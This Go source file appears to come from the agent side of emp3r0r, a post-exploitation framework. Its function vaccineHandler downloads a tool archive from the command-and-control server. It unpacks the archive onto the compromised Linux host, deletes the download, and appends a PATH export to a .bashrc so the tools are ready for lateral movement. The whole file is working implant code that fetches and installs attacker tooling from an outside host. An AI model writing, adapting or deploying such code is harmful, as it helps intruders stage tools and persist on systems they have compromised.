package agent

// build +linux

/*
install tools to emp3r0r_data.UtilsPath, for lateral movement
*/

import (
	"fmt"
	"log"
	"os"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

func vaccineHandler() (out string) {
	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/utils.tar.bz2")
	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/utils.tar.bz2", emp3r0r_data.AgentRoot+"/utils.tar.bz2")
	out = "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
		return
	}

	// unpack utils.tar.bz2 to our PATH
	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
		if err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700); err != nil {
			log.Print(err)
			return fmt.Sprintf("mkdir: %v", err)
		}
	}
	if err = archiver.Unarchive(emp3r0r_data.AgentRoot+"/utils.tar.bz2", emp3r0r_data.UtilsPath); err != nil {
		log.Printf("Unarchive: %v", err)
		return fmt.Sprintf("Unarchive: %v", err)
	}
	_ = os.Remove(emp3r0r_data.AgentRoot + "/utils.tar.bz2")

	// update PATH in .bashrc
	exportPATH := fmt.Sprintf("export PATH=%s:$PATH", emp3r0r_data.UtilsPath)
	if !util.IsStrInFile(exportPATH, emp3r0r_data.UtilsPath+"/.bashrc") {
		err = util.AppendToFile(emp3r0r_data.UtilsPath+"/.bashrc", exportPATH)
		if err != nil {
			log.Printf("Update bashrc: %v", err)
			out = fmt.Sprintf("Update bashrc: %v", err)
		}
	}
	return
}
